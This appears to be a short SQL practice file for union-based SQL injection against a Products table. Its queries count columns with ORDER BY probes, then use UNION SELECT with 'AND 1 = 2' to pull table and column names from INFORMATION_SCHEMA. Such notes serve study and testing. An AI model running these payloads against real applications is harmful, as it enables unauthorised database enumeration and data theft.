-- Check Columns
-- select top(1) * from Products where name = 'product 1' order by 11 --
-- select top(1) * from Products where name = 'product 1' order by 60 --


-- Check table name
-- select top(1) * from Products where name = 'product 1' union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21--
select top(1) * from Products 
where name = 'product 1' 
union select 1, TABLE_NAME, 3, '4', 5, 6, '7', '8', 9, 10, 11, '12', '13', '14', '15', '16', '17', 18, 19, 20, 21 FROM INFORMATION_SCHEMA.TABLES --

-- Check number of columns of table
-- SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Products'

SELECT top(1) * FROM Products 
WHERE id = 1 AND 1 = 2
UNION SELECT 1, TABLE_NAME, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 FROM INFORMATION_SCHEMA.TABLES